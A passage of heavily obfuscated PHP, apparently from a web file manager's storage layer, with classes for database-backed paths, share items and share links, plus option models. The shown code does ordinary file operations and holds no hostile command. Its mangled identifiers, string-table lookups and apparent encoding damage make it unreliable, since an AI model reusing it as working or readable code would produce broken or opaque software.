isset($”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[1253]])) { $”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[1253]] = $÷÷‰’ŒÄ[$”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[1253]]]; $”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[1254]] = $÷÷‰’ŒÄ[$”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[1254]]]; } if ($”¹–´õ[$Š®´å“ğ[33]] == $Š®´å“ğ[2240] && isset($”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[194]])) { $”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[194]] = $÷÷‰’ŒÄ[$”¹–´õ[$Š®´å“ğ[528]][$Š®´å“ğ[194]]]; } $”¹–´õ[$Š®´å“ğ[90]] = $÷÷‰’ŒÄ[$”¹–´õ[$Š®´å“ğ[194]]]; $”¹–´õ[$Š®´å“ğ[2245]] = $÷÷‰’ŒÄ[$”¹–´õ[$Š®´å“ğ[2229]]]; if ($”¹–´õ[$Š®´å“ğ[33]] == $Š®´å“ğ[1962]) { $”¹–´õ[$Š®´å“ğ[2245]] = $”¹–´õ[$Š®´å“ğ[90]]; $”¹–´õ[$Š®´å“ğ[2229]] = $”¹–´õ[$Š®´å“ğ[2245]][$Š®´å“ğ[194]]; $”¹–´õ[$Š®´å“ğ[90]] = !1; $”¹–´õ[$Š®´å“ğ[194]] = $Š®´å“ğ[12]; } $”¹–´õ[$Š®´å“ğ[2174]] = $ººÔ¢Ïş[$”¹–´õ[$Š®´å“ğ[1792]]]; } unset($”¹–´õ); $¶ÚâõƒÛ[$Š®´å“ğ[447]] = $Ùò§£ŞÀ; return $¶ÚâõƒÛ; } public function removeBySource($Äó€·ÔÊ) { $ÚÙÀÚ½ó = array($_SERVER[ıÚ˜š²İ][493] => $Äó€·ÔÊ); $this->where($ÚÙÀÚ½ó)->remove(); } } goto a¨¤¤Ğª‹Å; cÛ«ÒØ£¯: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ş©±Å¼ß) { $this->pathParse = $Ş©±Å¼ß; $this->model = Model($_SERVER[ıÚ˜š²İ][1442]); } public function getPath($ï€“÷ˆ§) { return trim($ï€“÷ˆ§, $_SERVER[ıÚ˜š²İ][8]); } public function pathFather($½œáâÜˆ) { $¯‰æƒµ = $this->parse($½œáâÜˆ); $¯‰æƒµ = $this->infoSimple($½œáâÜˆ); return $¯‰æƒµ ? $¯‰æƒµ[$_SERVER[ıÚ˜š²İ][193]] : !1; } public function pathThis($Ù†ü‘Ò¬) { $ä§»¨Õ· = $this->infoSimple($Ù†ü‘Ò¬); return $ä§»¨Õ· ? $ä§»¨Õ·[$_SERVER[ıÚ˜š²İ][32]] : !1; } public function getPathOuter($©ƒ¥ ½) { if (!$©ƒ¥ ½) { return $©ƒ¥ ½; } $ Î·çŠ‘ = $this->parse($©ƒ¥ ½); return KodIO::make($ Î·çŠ‘[$_SERVER[ıÚ˜š²İ][477]]); } public function copyFolderFromIO($¡ÏíÌ¾õ, $¾íÔÕ‡î, $•‰Ïó, $µÊé½§Â, $¶¦¥»™¦) { $ºªîæ…ù = $this->model->copyFolderFromIO($¡ÏíÌ¾õ, $¾íÔÕ‡î, $•‰Ïó, $µÊé½§Â, $¶¦¥»™¦); return KodIO::make($ºªîæ…ù); } public function isParentOf($ı¿ÑÇ–­, $¢ŒÓ¤»¸) { return $this->model->isParentOf($ı¿ÑÇ–­, $¢ŒÓ¤»¸); } public function mkfile($¼ÀÁã, $û±­„ƒ = '', $ıËØØ÷¡ = REPEAT_RENAME) { $¨¿öı§é =& $_SERVER[ıÚ˜š²İ]; $ĞØ¢ö°· = $this->parse($¼ÀÁã); $¼ÀÁã = $ĞØ¢ö°·[$¨¿öı§é[477]]; for ($ÓĞ‹Ê¶õ = 0; $ÓĞ‹Ê¶õ < count($ĞØ¢ö°·[$¨¿öı§é[1443]]); $ÓĞ‹Ê¶õ++) { $ó˜¢ëŸ§ = $ĞØ¢ö°·[$¨¿öı§é[1443]][$ÓĞ‹Ê¶õ]; if ($ÓĞ‹Ê¶õ == count($ĞØ¢ö°·[$¨¿öı§é[1443]]) - 1) { $¼ÀÁã = $this->model->mkfile($¼ÀÁã, $ó˜¢ëŸ§, $û±­„ƒ, $ıËØØ÷¡); break; } $¼ÀÁã = $this->model->mkdir($¼ÀÁã, $ó˜¢ëŸ§, REPEAT_SKIP); } return $this->getPathOuter($¼ÀÁã); } public function mkdir($¬úïË±µ, $—«õ§¦Ä = REPEAT_SKIP) { $™èøÍö” =& $_SERVER[ıÚ˜š²İ]; $ú Üà£„ = $this->parse($¬úïË±µ); $¬úïË±µ = $ú Üà£„[$™èøÍö”[477]]; for ($ƒ÷ûğš = 0; $ƒ÷ûğš < count($ú Üà£„[$™èøÍö”[1443]]); $ƒ÷ûğš++) { $˜™¤Å”Ó = $ú Üà£„[$™èøÍö”[1443]][$ƒ÷ûğš]; $¬úïË±µ = $this->model->mkdir($¬úïË±µ, $˜™¤Å”Ó, $—«õ§¦Ä); } return $this->getPathOuter($¬úïË±µ); } public function copyFile($ïÅë”ğÒ, $€â½Æ…ï, $šòÚ·µí = REPEAT_REPLACE) { $Üßßó• =& $_SERVER[ıÚ˜š²İ]; $¿Å ´Šõ = $this->parse($€â½Æ…ï); $†ıŒş°Ş = $this->model->copy($ïÅë”ğÒ, $¿Å ´Šõ[$Üßßó•[477]], $šòÚ·µí, $¿Å ´Šõ[$Üßßó•[87]]); return $†ıŒş°Ş ? $this->getPathOuter($†ıŒş°Ş) : !1; } public function moveFile($¼³´ûÅó, $Í™¿–ûË, $õ–¥“Ä  = REPEAT_REPLACE) { $¿ğù™‰ =& $_SERVER[ıÚ˜š²İ]; $´ÜŸ¨ÒŸ = $this->parse($Í™¿–ûË); $”ïĞÛ¨¬ = $this->model->move($¼³´ûÅó, $´ÜŸ¨ÒŸ[$¿ğù™‰[477]], $õ–¥“Ä , $´ÜŸ¨ÒŸ[$¿ğù™‰[87]]); return $”ïĞÛ¨¬ ? $this->getPathOuter($”ïĞÛ¨¬) : !1; } public function copy($šçˆû€Ó, $«ÆòÏæ•, $æà‰¤‚¡ = REPEAT_REPLACE, $±¡ããâë = false) { $œõÊ°«‹ = $this->parse($«ÆòÏæ•); $øô§½ô = $this->model->copy($šçˆû€Ó, $œõÊ°«‹[$_SERVER[ıÚ˜š²İ][477]], $æà‰¤‚¡, $±¡ããâë); return $øô§½ô ? $this->getPathOuter($øô§½ô) : !1; } public function moveSameAllow() { } public function move($¼ÔÆşòÌ, $•öªû„™, $Ûà¢öüĞ = REPEAT_REPLACE, $Ö¶¨œú = false) { $˜¯İ¿’Ä = $this->parse($•öªû„™); $êßÉÛÅ = $this->model->move($¼ÔÆşòÌ, $˜¯İ¿’Ä[$_SERVER[ıÚ˜š²İ][477]], $Ûà¢öüĞ, $Ö¶¨œú); return $êßÉÛÅ ? $this->getPathOuter($êßÉÛÅ) : !1; } public function remove($Í³ø®›, $ªûòõ˜è = true) { return $this->model->remove($Í³ø®›, $ªûòõ˜è); } public function rename($ØëÅè¿Ó, $“’ÙÑœÒ) { $¥ñåÛ«” = $this->model->rename($ØëÅè¿Ó, $“’ÙÑœÒ); return $¥ñåÛ«” ? $this->getPathOuter($ØëÅè¿Ó) : $¥ñåÛ«”; } public function size($¼ß²¹¼ü) { $ñÂ³¥ ¼ = $this->infoSimple($¼ß²¹¼ü); return $ñÂ³¥ ¼ ? $ñÂ³¥ ¼[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function infoSimple($›ô…ƒış) { return $this->model->sourceInfo($›ô…ƒış); } public function info($ù¸»àÒÊ) { return $this->infoParse($ù¸»àÒÊ); } public function infoAuth($ò˜ÜºÈâ) { return $this->infoParse($ò˜ÜºÈâ, !1, !0); } public function infoWithChildren($¯ªü…ÖÇ) { return $this->infoParse($¯ªü…ÖÇ, !0); } protected function infoParse($ØÈ«ªì, $Ò˜±Ø»À = false, $ÔƒÈäÂ“ = false) { if (!$Ò˜±Ø»À) { return $this->model->pathInfo($ØÈ«ªì, $ÔƒÈäÂ“); } return $this->model->pathInfoMore($ØÈ«ªì); } public function infoFullSimple($ôŸ¡¿¿‰) { $Ë®…¡í =& $_SERVER[ıÚ˜š²İ]; $»¾ôÁù = explode($Ë®…¡í[8], $ôŸ¡¿¿‰); $ËÅå°É¦ = implode($Ë®…¡í[8], array_splice($»¾ôÁù, 1)); return $this->model->pathInfoByPath($»¾ôÁù[0], $ËÅå°É¦); } public function infoFull($ºƒÜ…å’) { $È­ª·ãü = $this->infoFullSimple($ºƒÜ…å’); return is_array($È­ª·ãü) ? $this->model->pathInfo($È­ª·ãü[$_SERVER[ıÚ˜š²İ][194]]) : !1; } public function hashSimple($ú¿úÔÙ) { $µïÇ©ŞÎ =& $_SERVER[ıÚ˜š²İ]; $òƒäÂà¤ = $this->infoWithChildren($ú¿úÔÙ); return $òƒäÂà¤[$µïÇ©ŞÎ[170]][$µïÇ©ŞÎ[679]]; } public function hashMd5($³ŒŞ×Ô) { $ÌáØŸÉš =& $_SERVER[ıÚ˜š²İ]; $°•ƒø© = $this->infoWithChildren($³ŒŞ×Ô); return $°•ƒø©[$ÌáØŸÉš[170]][$ÌáØŸÉš[551]]; } public function exist($Áä¬ßÎ) { $ÚÏ©È§Ù =& $_SERVER[ıÚ˜š²İ]; $¬¬­íÀ = $this->parse($Áä¬ßÎ); if (!$¬¬­íÀ[$ÚÏ©È§Ù[87]]) { return $this->isFile($Áä¬ßÎ) || $this->isFolder($Áä¬ßÎ); } $¤½„™ğ° = array($ÚÏ©È§Ù[479] => $¬¬­íÀ[$ÚÏ©È§Ù[477]], $ÚÏ©È§Ù[32] => $¬¬­íÀ[$ÚÏ©È§Ù[87]]); $ï…™çáí = $this->model->where($¤½„™ğ°)->find(); return $ï…™çáí ? !0 : !1; } public function isFile($»úÍë„) { $‘Û’ï =& $_SERVER[ıÚ˜š²İ]; $¥§åÒñÏ = $this->infoSimple($»úÍë„); return $¥§åÒñÏ && $¥§åÒñÏ[$‘Û’ï[487]] == $‘Û’ï[231] ? !0 : !1; } public function isFolder($Úòì¯çÙ) { $Êû¸ĞÁ± =& $_SERVER[ıÚ˜š²İ]; $²§‡‹æ = $this->infoSimple($Úòì¯çÙ); return $²§‡‹æ && $²§‡‹æ[$Êû¸ĞÁ±[487]] == $Êû¸ĞÁ±[91] ? !0 : !1; } public function listPath($®æ›½æ„, $—±´º¦’ = false) { $¼š¸°ÈÍ =& $_SERVER[ıÚ˜š²İ]; if ($®æ›½æ„ == $¼š¸°ÈÍ[12]) { return !1; } $ìÈºñàÔ = array($¼š¸°ÈÍ[479] => $®æ›½æ„); if ($—±´º¦’) { return $this->model->listSource($ìÈºñàÔ, -1); } return $this->model->listSource($ìÈºñàÔ); } public function has($Ş¬ÎÆ€Ø, $–ªŸ•’• = false, $Äñ•Œëî = null) { $Å¨ëçÅ÷ =& $_SERVER[ıÚ˜š²İ]; $Ú”µ‘“¦ = $this->infoWithChildren($Ş¬ÎÆ€Ø); if ($–ªŸ•’•) { return array($Å¨ëçÅ÷[243] => $Ú”µ‘“¦[$Å¨ëçÅ÷[243]], $Å¨ëçÅ÷[242] => $Ú”µ‘“¦[$Å¨ëçÅ÷[242]]); } return $Äñ•Œëî ? $Ú”µ‘“¦[$Å¨ëçÅ÷[243]] : $Ú”µ‘“¦[$Å¨ëçÅ÷[242]]; } public function listAll($Í„Âùç) { $œñüº’í = IO::info($this->pathParse[$_SERVER[ıÚ˜š²İ][87]]); if (!$œñüº’í) { return array(); } return $this->model->listAll($Í„Âùç); } public function getContent($ŠôÕ´ØÑ) { return $this->model->getContent($ŠôÕ´ØÑ); } public function setContent($š×½‹å›, $¼Ü¿å¶Ô = '') { return $this->model->setContent($š×½‹å›, $¼Ü¿å¶Ô); } public function fileSubstr($¾ÂĞ‹Ÿ…, $ÚÅÙ¨Õ‘, $¥ÇµÀ‚Ä) { return $this->model->fileSubstr($¾ÂĞ‹Ÿ…, $ÚÅÙ¨Õ‘, $¥ÇµÀ‚Ä); } public function download($‘Š‚±»†, $ò¾•®ËØ = '') { $ë²Ğé‹ = get_path_father($ò¾•®ËØ); $€ıº— = get_path_this($ò¾•®ËØ); $€©Â°… = $this->model->fileInfoGet($‘Š‚±»†); $æä²²çá = IO::copy($€©Â°…[$_SERVER[ıÚ˜š²İ][87]], $ë²Ğé‹, !1, $€ıº—); return $æä²²çá; } public function setModifyTime($€­„ƒæ, $ÓŞÁúÖ‘ = '') { $‡›âıÃ =& $_SERVER[ıÚ˜š²İ]; if (!$€­„ƒæ) { return; } $this->model->where(array($‡›âıÃ[493] => $€­„ƒæ))->save(array($‡›âıÃ[88] => $ÓŞÁúÖ‘)); } public function upload($£ä Ù¥, $óŒè¢’¢, $êşÅÄÈÙ = false, $¿–·È¢Á = REPEAT_REPLACE) { $ŒöÆïÚü =& $_SERVER[ıÚ˜š²İ]; $Ø–À¬›Ò = $this->parse($£ä Ù¥); $«àÉ´µ¸ = $this->model->addFile($Ø–À¬›Ò[$ŒöÆïÚü[477]], $óŒè¢’¢, $Ø–À¬›Ò[$ŒöÆïÚü[87]], $êşÅÄÈÙ, $¿–·È¢Á); return $this->getPathOuter($«àÉ´µ¸); } public function uploadFileByID($øïËãù°, $ƒŸ°èã¦, $ëî¢³ãƒ) { $ïÙ“èÜÂ =& $_SERVER[ıÚ˜š²İ]; $¹×Š‰Ò = $this->parse($øïËãù°); $æÖö‘£ç = $this->model->addFileByFileID($¹×Š‰Ò[$ïÙ“èÜÂ[477]], $ƒŸ°èã¦, $¹×Š‰Ò[$ïÙ“èÜÂ[87]], $ëî¢³ãƒ); return $this->getPathOuter($æÖö‘£ç); } public function addFileByRemote($«äªº¿, $¯ÖšÓğì, $Ï˜ùÖ²‘ = array(), $­ûÅÏú› = '', $À¸„”í) { $ ô¯öªî =& $_SERVER[ıÚ˜š²İ]; $½ª¸³…Æ = $this->parse($«äªº¿); $­ûÅÏú› = empty($­ûÅÏú›) ? $½ª¸³…Æ[$ ô¯öªî[87]] : $­ûÅÏú›; $ñ®ÖšÉ = $this->model->addFileByRemote($½ª¸³…Æ[$ ô¯öªî[477]], $¯ÖšÓğì, $­ûÅÏú›, $Ï˜ùÖ²‘, $À¸„”í); return $this->getPathOuter($ñ®ÖšÉ); } public function uploadLink($µ¸Âùğã, $ÂØßèéã = 0) { $¨™õ¨ˆô =& $_SERVER[ıÚ˜š²İ]; $º×µİ  = $this->parse($µ¸Âùğã); $êóøÑù = _get($GLOBALS[$¨™õ¨ˆô[7]], $¨™õ¨ˆô[1444]); $Î†êãµ” = _get($GLOBALS[$¨™õ¨ˆô[7]], $¨™õ¨ˆô[1445]); $‘ÀŠ ¼Š = KodIO::ioFileDriverGet($¨™õ¨ˆô[485] . $º×µİ [$¨™õ¨ˆô[477]] . $¨™õ¨ˆô[404]); $âÄŞ–õ = Model($¨™õ¨ˆô[681])->createFileName($º×µİ [$¨™õ¨ˆô[87]], $‘ÀŠ ¼Š, $êóøÑù, $Î†êãµ”); return IO::uploadLink($âÄŞ–õ, $ÂØßèéã); } public function fileNameAuto($Š’ßš‚, $ü…“î¸‚, $“ŞöÌ·ß = REPEAT_REPLACE, $Âøé‰ŒÈ = false) { return $this->model->fileNameAuto($Š’ßš‚, $ü…“î¸‚, $“ŞöÌ·ß, $Âøé‰ŒÈ); } public function fileNameExist($…šÕ¯šÁ, $È³ğé®Õ) { return $this->model->fileNameExist($…šÕ¯šÁ, $È³ğé®Õ); } protected function _fileOut($Ÿ„±È‰Ü, $™•àˆï‚ = false, $ô˜ëõ = false, $šòŠò®æ = '', $ÂçÈ¾Ö = false) { $Í™ò¬ÕÁ =& $_SERVER[ıÚ˜š²İ]; $˜Ğ­×¤Â = $this->model->sourceInfo($Ÿ„±È‰Ü); if ($˜Ğ­×¤Â[$Í™ò¬ÕÁ[487]] == $Í™ò¬ÕÁ[91]) { header($Í™ò¬ÕÁ[1446]); die; } $ßÚŠ²® = $this->model->fileInfoGet($Ÿ„±È‰Ü); $šòŠò®æ = $ßÚŠ²®[$Í™ò¬ÕÁ[551]] ? $ßÚŠ²®[$Í™ò¬ÕÁ[551]] : $šòŠò®æ; $¿¹¨ï¢Œ = isset($GLOBALS[$Í™ò¬ÕÁ[183]]) && is_array($GLOBALS[$Í™ò¬ÕÁ[183]]) ? $GLOBALS[$Í™ò¬ÕÁ[183]][$Í™ò¬ÕÁ[32]] : $˜Ğ­×¤Â[$Í™ò¬ÕÁ[32]]; if ($ÂçÈ¾Ö) { return IO::fileOutServer($ßÚŠ²®[$Í™ò¬ÕÁ[87]], $™•àˆï‚, $¿¹¨ï¢Œ, $šòŠò®æ); } IO::fileOut($ßÚŠ²®[$Í™ò¬ÕÁ[87]], $™•àˆï‚, $¿¹¨ï¢Œ, $šòŠò®æ); } public function fileOut($»ğ’šá², $Ñ ùæ¿ = false, $é­ˆ³Ïí = false, $×ĞÀÇ˜± = '') { $this->_fileOut($»ğ’šá², $Ñ ùæ¿, $é­ˆ³Ïí, $×ĞÀÇ˜±); } public function fileOutServer($¶Ê”™ğ¢, $Şå°ú…Ö = false, $£š¢¡ˆ = false, $“†ğÙìÄ = '') { $this->_fileOut($¶Ê”™ğ¢, $Şå°ú…Ö, $£š¢¡ˆ, $“†ğÙìÄ, !0); } protected function _fileOutImage($õ´¥Ëé, $áŞ›¯¼° = 250) { $ÎÂõ‡ =& $_SERVER[ıÚ˜š²İ]; $”ØäÄ» = $this->model->pathInfo($õ´¥Ëé); if ($”ØäÄ»[$ÎÂõ‡[487]] == $ÎÂõ‡[91]) { show_json($ÎÂõ‡[1447] . $õ´¥Ëé, !1); } $ª®øíüˆ = $this->model->fileInfoGet($õ´¥Ëé); $”ØäÄ»[$ÎÂõ‡[184]] = $ª®øíüˆ[$ÎÂõ‡[87]]; $GLOBALS[$ÎÂõ‡[183]] = $”ØäÄ»; IO::fileOutImage($ª®øíüˆ[$ÎÂõ‡[87]], $áŞ›¯¼°); } public function fileOutImage($ûâÔ¡ï‰, $šûæä¸« = 250) { $this->_fileOutImage($ûâÔ¡ï‰, $šûæä¸«); } public function fileOutImageServer($±ŒÓÏ‚¾, $áÚ¹ÛÑó = 250) { $this->_fileOutImage($±ŒÓÏ‚¾, $áÚ¹ÛÑó); } public function link($Ä¾ÄÍÑ¯, $ÑàùÉ¤ = '') { $Ë»á•Ş = $this->model->fileInfoGet($Ä¾ÄÍÑ¯); return IO::link($Ë»á•Ş[$_SERVER[ıÚ˜š²İ][87]], $ÑàùÉ¤); } protected function parse($ñå¦¥ò„) { $£°È‚Ì¦ =& $_SERVER[ıÚ˜š²İ]; if (strstr($ñå¦¥ò„, $£°È‚Ì¦[8]) === !1) { return array($£°È‚Ì¦[495] => intval($ñå¦¥ò„), $£°È‚Ì¦[87] => $£°È‚Ì¦[12], $£°È‚Ì¦[1443] => array()); } $½ßÄ´å’ = explode($£°È‚Ì¦[8], trim($ñå¦¥ò„, $£°È‚Ì¦[8])); if (count($½ßÄ´å’) < 2) { show_tips(clear_html($ñå¦¥ò„) . $£°È‚Ì¦[1448]); } return array($£°È‚Ì¦[495] => intval($½ßÄ´å’[0]), $£°È‚Ì¦[87] => $½ßÄ´å’[1], $£°È‚Ì¦[1443] => array_slice($½ßÄ´å’, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($°·¹éÔ) { $this->pathParse = $°·¹éÔ; $this->model = Model($_SERVER[ıÚ˜š²İ][1442]); } public function getPathOuter($öÕ—ıö) { $–î×àí• =& $_SERVER[ıÚ˜š²İ]; if (!$öÕ—ıö) { return $öÕ—ıö; } $Ÿ›¼ëøã = $this->parse($öÕ—ıö); return trim(KodIO::makeShare($this->pathParse[$–î×àí•[477]], $Ÿ›¼ëøã[$–î×àí•[477]]), $–î×àí•[8]); } protected function infoParse($ÁÎãœª¢, $ğã£í¾ = false, $ŸË¼ áœ = false) { $•áô‘Ş§ =& $_SERVER[ıÚ˜š²İ]; $ÕÒ‘¸§İ = $this->pathParse[$•áô‘Ş§[477]]; $îÈç›ş = trim($this->pathParse[$•áô‘Ş§[1263]], $•áô‘Ş§[8]); return Action($•áô‘Ş§[1449])->sharePathInfo($ÕÒ‘¸§İ, $îÈç›ş, $ğã£í¾); } public function infoFull($â–üìÆÙ) { $Û„ş»Îš =& $_SERVER[ıÚ˜š²İ]; $ğıÅÄ¬ = explode($Û„ş»Îš[8], trim($â–üìÆÙ, $Û„ş»Îš[8])); if (count($ğıÅÄ¬) > 1) { $‡€²¤Æ = implode($Û„ş»Îš[8], array_splice($ğıÅÄ¬, 1)); $Ø§šµğÆ = $this->model->pathInfoByPath($ğıÅÄ¬[0], $‡€²¤Æ); if (!$Ø§šµğÆ) { return !1; } $this->pathParse[$Û„ş»Îš[1263]] = $Ø§šµğÆ[$Û„ş»Îš[194]]; } return $this->infoParse($â–üìÆÙ); } public function listAll($‡Ã¤ŠÇ‘) { $‘ôŸÜóµ =& $_SERVER[ıÚ˜š²İ]; $Èê‡Õ½ = IO::info($this->pathParse[$‘ôŸÜóµ[87]]); if (!$Èê‡Õ½) { return array(); } $áï³ä¾› = $this->model->listAll($‡Ã¤ŠÇ‘); $º¡‹Õ«• = Model($‘ôŸÜóµ[671])->getInfo($Èê‡Õ½[$‘ôŸÜóµ[672]]); foreach ($áï³ä¾› as &$Ø²ô«ÏÊ) { check_abort(); $Ø²ô«ÏÊ[$‘ôŸÜóµ[90]] = Action($‘ôŸÜóµ[1449])->_shareItemeParse($Ø²ô«ÏÊ[$‘ôŸÜóµ[90]], $º¡‹Õ«•); } unset($Ø²ô«ÏÊ); return $áï³ä¾›; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($‚ÌÉ›¶¼) { $this->pathParse = $‚ÌÉ›¶¼; $this->model = Model($_SERVER[ıÚ˜š²İ][1442]); } protected function infoParse($û‘ñşò, $üóĞïÒ¥ = false, $âÀ¦¯Âå = false) { $ºù«´ù’ =& $_SERVER[ıÚ˜š²İ]; return Action($ºù«´ù’[1270])->sharePathInfo($this->pathParse[$ºù«´ù’[87]], !0, $üóĞïÒ¥); } public function listPath($ÓÏ›Ì×ß, $‘ı‡š® = false) { $ä›Ù™¬Ö =& $_SERVER[ıÚ˜š²İ]; $±Ì™Îàğ = parent::listPath($ÓÏ›Ì×ß, $‘ı‡š®); if (!$±Ì™Îàğ) { return $±Ì™Îàğ; } if (is_array($±Ì™Îàğ[$ä›Ù™¬Ö[1450]])) { $±Ì™Îàğ[$ä›Ù™¬Ö[1450]] = Action($ä›Ù™¬Ö[1270])->shareItemInfo($±Ì™Îàğ[$ä›Ù™¬Ö[1450]]); } foreach ($±Ì™Îàğ as $öœÀŸê => $ã¹ª¬Á) { if (!in_array($öœÀŸê, array($ä›Ù™¬Ö[86], $ä›Ù™¬Ö[85]))) { continue; } foreach ($ã¹ª¬Á as $óù·‘åá => $şø©ãÁ˜) { $±Ì™Îàğ[$öœÀŸê][$óù·‘åá] = Action($ä›Ù™¬Ö[1270])->shareItemInfo($şø©ãÁ˜); } } return $±Ì™Îàğ; } public function listAll($½ŒüÅÂ) { $æÌğ¦ó =& $_SERVER[ıÚ˜š²İ]; $ŒüİâÖ = IO::info($this->pathParse[$æÌğ¦ó[87]]); if (!$ŒüİâÖ) { return array(); } $óÉ¡¶ñ¿ = $this->model->listAll($½ŒüÅÂ); foreach ($óÉ¡¶ñ¿ as &$­èâ¹ËÑ) { $­èâ¹ËÑ[$æÌğ¦ó[90]] = Action($æÌğ¦ó[1270])->shareItemInfo($­èâ¹ËÑ[$æÌğ¦ó[90]]); } unset($­èâ¹ËÑ); return $óÉ¡¶ñ¿; } } goto bï•ƒ„Ç†Ü; b²é®³âĞ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\x4f\x70\x74\x69\157\x6e"; public $field = array(); public function listData($“ö¸»‰ = false, $Ğ›ääßÊ = "\x6d\x6f\144\x69\146\x79\124\x69\x6d\145", $—ÛËö³× = false) { $¡Ê÷´ƒ¾ = Model($this->modelType)->get(!1, $this->optionType, !0); $–ÃÜÙÉÀ = array_values($¡Ê÷´ƒ¾); if ($–ÃÜÙÉÀ && $–ÃÜÙÉÀ[0] && !is_array($–ÃÜÙÉÀ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¡Ê÷´ƒ¾ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¡Ê÷´ƒ¾) { return $“ö¸»‰ ? null : array(); } if (!$“ö¸»‰) { $¡Ê÷´ƒ¾ = array_filter(array_values($¡Ê÷´ƒ¾)); return array_sort_by($¡Ê÷´ƒ¾, $Ğ›ääßÊ, $—ÛËö³×); } return $¡Ê÷´ƒ¾[$_SERVER[ıÚ˜š²İ][474] . $“ö¸»‰]; } public function insert($Â¿°§òã) { $°‹ì¥½ =& $_SERVER[ıÚ˜š²İ]; $Â¿°§òã = array_field_key($Â¿°§òã, $this->field); $¹Ÿ¿¡†ö = Model($this->modelType)->get($°‹ì¥½[475], $this->optionType . $°‹ì¥½[476]); $¹Ÿ¿¡†ö = $¹Ÿ¿¡†ö ? $¹Ÿ¿¡†ö : 0; $Â¿°§òã[$°‹ì¥½[477]] = ++$¹Ÿ¿¡†ö; $Â¿°§òã[$°‹ì¥½[234]] = time(); $Â¿°§òã[$°‹ì¥½[88]] = time(); Model($this->modelType)->set($°‹ì¥½[475], $¹Ÿ¿¡†ö, $this->optionType . $°‹ì¥½[476]); Model($this->modelType)->set($°‹ì¥½[474] . $¹Ÿ¿¡†ö, $Â¿°§òã, $this->optionType); return $¹Ÿ¿¡†ö; } public function update($‚ˆÖÁÃ“, $„›¼šì) { $—ø¬ƒŠ± =& $_SERVER[ıÚ˜š²İ]; $„›¼šì = array_field_key($„›¼šì, $this->field); $î’ÁÊÇ = $this->listData($‚ˆÖÁÃ“); if (!$î’ÁÊÇ || !$‚ˆÖÁÃ“) { return !1; } $„›¼šì = array_merge($î’ÁÊÇ, $„›¼šì); $„›¼šì[$—ø¬ƒŠ±[88]] = time(); return Model($this->modelType)->set($—ø¬ƒŠ±[474] . $‚ˆÖÁÃ“, $„›¼šì, $this->optionType); } public function remove($Õ şøÂ) { if (!$Õ şøÂ) { return !1; } return Model($this->modelType)->remove($_SERVER[ıÚ˜š²İ][474] . $Õ şøÂ, $this->optionType); } public function clear() { $œç¦’š‹ =& $_SERVER[ıÚ˜š²İ]; Model($this->modelType)->remove($œç¦’š‹[475], $this->optionType . $œç¦’š‹[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($’»Õòå“, $Å›ö°¾É) { if (!$Å›ö°¾É) { return !1; } $ı†öÍ›Ù = $this->listData(); $ı†öÍ›Ù = array_to_keyvalue($ı†öÍ›Ù, $’»Õòå“); return isset($ı†öÍ›Ù[$Å›ö°¾É]) ? $ı†öÍ›Ù[$Å›ö°¾É] : !1; } public function findByName($¸¡—ûÖ) { return $this->findByKey($_SERVER[ıÚ˜š²İ][32], $¸¡—ûÖ); } protected function resetData($±³ƒ¼ø‚) { $·¹°Åïš =& $_SERVER[ıÚ˜š²İ]; $±³ƒ¼ø‚ = is_array($±³ƒ¼ø‚) ? $±³ƒ¼ø‚ : array(); $éÚ˜‡ = array(); for ($Ôí‚õ¸ = 0; $Ôí‚õ¸ < count($±³ƒ¼ø‚); $Ôí‚õ¸++) { $éÚ˜‡[$·¹°Åïš[474] . $±³ƒ¼ø‚[$Ôí‚õ¸][$·¹°Åïš[477]]] = $±³ƒ¼ø‚[$Ôí‚õ¸]; } return Model($this->modelType)->set($éÚ˜‡, !1, $this->optionType); } private function getAutoName($·âè…œµ) { $î­£­ = array_to_keyvalue($this->listData(), $_SERVER[ıÚ˜š²İ][32]); if (!$î­£­ || !isset($î­£­[$·âè…œµ])) { return $·âè…œµ; } for ($´ÇÖÔ» = 1; $´ÇÖÔ» < count($î­£­); $´ÇÖÔ»++) { $ÂŸßÇ = $·âè…œµ . "\50{$´ÇÖÔ»}\x29"; if (!isset($î­£­[$ÂŸßÇ])) { return $ÂŸßÇ; } } return $ÂŸßÇ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($©áĞÃş = false, $…×²¦… = '', $¹İŸºÃÆ = false) { $Ê§Â±é¸ =& $_SERVER[ıÚ˜š²İ]; $êŒÅ‰ô– = $this->cacheGet($…×²¦…); $´««„½ş = $this->optionDefault($…×²¦…); $´««„½ş = is_array($´««„½ş) ? $´««„½ş : array(); if (is_array($êŒÅ‰ô–)) { $êŒÅ‰ô– = array_merge($´««„½ş, $êŒÅ‰ô–); return $©áĞÃş ? isset($êŒÅ‰ô–[$©áĞÃş]) ? $êŒÅ‰ô–[$©áĞÃş] : null : $êŒÅ‰ô–; } $áÛÂ™ŠÊ = $this->filterWhere(array($Ê§Â±é¸[33] => $…×²¦…)); $êŒÅ‰ô– = $this->where($áÛÂ™ŠÊ)->select(); $êŒÅ‰ô– = array_to_keyvalue($êŒÅ‰ô–, $Ê§Â±é¸[97], $Ê§Â±é¸[452]); foreach ($êŒÅ‰ô– as $²ğ›ª’Ë => $ÇÁ‚¹Ó) { if ($¹İŸºÃÆ || in_array($²ğ›ª’Ë, $this->jsonField)) { $êŒÅ‰ô–[$²ğ›ª’Ë] = json_decode($ÇÁ‚¹Ó, !0); } } $this->cacheSet($…×²¦…, $êŒÅ‰ô–); $êŒÅ‰ô– = array_merge($´««„½ş, $êŒÅ‰ô–); return $©áĞÃş ? $êŒÅ‰ô–[$©áĞÃş] : $êŒÅ‰ô–; } public function 